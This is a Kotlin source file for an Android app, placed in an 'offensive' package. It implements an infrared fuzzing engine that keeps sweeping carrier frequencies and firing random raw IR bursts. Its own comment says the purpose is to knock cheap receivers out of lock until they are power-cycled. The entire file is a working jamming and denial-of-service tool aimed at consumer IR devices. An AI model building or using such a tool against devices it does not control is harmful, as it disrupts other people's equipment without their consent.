package com.droid.whaly.offensive

import android.content.Context
import com.droid.whaly.IrBackend
import com.droid.whaly.IrButton
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.Random
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Carrier sweep and pattern fuzz over the IR transmitter. Cheap receivers lose lock when the
 * carrier drifts while the frame length stays random; most recover only on power cycle.
 */
object IrFuzzEngine {

    private val running = AtomicBoolean(false)
    private val executor = Executors.newSingleThreadExecutor()
    private val random = Random()

    private val _bursts = MutableStateFlow(0)
    val bursts: StateFlow<Int> = _bursts.asStateFlow()

    private val _frequency = MutableStateFlow(38000)
    val frequency: StateFlow<Int> = _frequency.asStateFlow()

    private val _status = MutableStateFlow("Idle")
    val status: StateFlow<String> = _status.asStateFlow()

    fun start(context: Context) {
        if (!running.compareAndSet(false, true)) return
        val appContext = context.applicationContext
        if (!IrBackend.isAvailable(appContext)) {
            running.set(false)
            _status.value = "No IR transmitter"
            return
        }
        _bursts.value = 0
        _status.value = "Sweeping"
        executor.execute {
            while (running.get()) {
                val carrier = 30000 + random.nextInt(16) * 2000
                val pattern = IntArray(8 + random.nextInt(56)) { 80 + random.nextInt(1800) }
                _frequency.value = carrier
                try {
                    IrBackend.transmit(
                        appContext,
                        IrButton(
                            name = "carrier-sweep",
                            frequency = carrier,
                            pattern = pattern,
                            protocol = "RAW",
                        ),
                    )
                    _bursts.value = _bursts.value + 1
                } catch (error: Exception) {
                    _status.value = "Transmit failed: ${error.message}"
                }
                try {
                    Thread.sleep(45)
                } catch (_: InterruptedException) {
                    break
                }
            }
            _status.value = "Stopped"
        }
    }

    fun stop() {
        running.set(false)
    }

    fun isRunning(): Boolean = running.get()
}
